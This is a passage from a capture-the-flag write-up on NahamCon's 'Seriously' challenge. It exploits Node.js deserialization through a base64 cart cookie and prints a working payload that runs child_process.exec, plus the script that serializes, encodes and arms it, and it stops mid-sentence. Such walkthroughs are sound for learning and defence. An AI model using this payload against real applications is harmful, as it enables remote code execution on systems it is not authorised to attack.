# NahamCon CTF - Seriously

So we have five "plant stores" and we need to hack it to get the flag.
At first I thought the challenge was somehow related to escalate privileges among them.

There are two hints here:
* The message on the checkout option, saying it was prohibited due to security issues.
* The name of the game itself ("seriously"), as I found later.

I tried all the stores to see if the checkout was open on any of them, but they were not (and stores 3 and 4 were down).

The **/cart** URL used a cookie called also **cart**, to store the items, encoded in base64:
**Base64:**
```
eyJpdGVtcyI6eyIwIjp7Im5hbWUiOiJIYXdvcnRoaW9wc2lzIGF0dGVudWF0YSIsInByaWNlIjoxOS45OSwiY291bnQiOjF9LCIyIjp7Im5hbWUiOiJEcmFjYWVuYSB0cmlmYXNjaWF0YSIsInByaWNlIjoxNC45OSwiY291bnQiOjF9fX0K`
```
**Decoded:** 
```
{"items":{"0":{"name":"Haworthiopsis attenuata","price":19.99,"count":1},"2":{"name":"Dracaena trifasciata","price":14.99,"count":1}}}
````

OK, using a 404 error, we see it's a node application, so I found a Javascript deserialization vulnerability.

### First Try: Shell

Using a sample payload online, I tried to call OS commands.
The snippet bellow is the same structure of the cart, but I changed the name to an evil function.

```
evil = {
  items: {
    '0': { name: 'Haworthiopsis attenuata', price: 19.99, count: 1 },
    '2': { name: 'Dracaena trifasciata', price: 14.99, count: 1 },
    '3': { name: function(){
			require('child_process').exec('ls / >> nep10.txt', function(error, stdout, stderr) { return 'Neptunian'; });
		}, 
    	price: 14.99, count: 1,  },
  }
}**()**
```

And the plan is to serialize the evil object to send to the server.

Something about the **()** above: if you put the parentheses in this constructor, it will run the function, and the serialized version will get only the result.
I had to put the **()** it after serializing for it to run only after deserialization.

And testing:
```
let buff = new Buffer.from(serialize.serialize(evil2));

console.log('Evil Serialized:');
// buff2 = buff.toString('ascii');

// Had to replace here to be automatic.
// If I put the "()" and the end of the function, it will run and serialize the result!!
// But if I put only in the serialized version, it will run only in the server, just after deserializing!
// This way, I can work with a complete code, test the payload locally (below) and send it ready to the server.
buff2 = buff.toString('ascii').replace('}","price', '}()","price');
console.log(buff2 + '\n\n');

console.log('Evil Base64');
let base64data = Buffer.from(buff2).toString('base64');
console.log(base64data + '\n\n');

console.log('Evil URL Encoded:');
let payload = urlencode(base64data);
console.log(payload + '\n\n');
```

Now I had a payload.
It worked locally, but I couldnt make the exec command work (tried with curl).

### The Real Deal: Owning with Javascript

I dont really need a shell when I can run 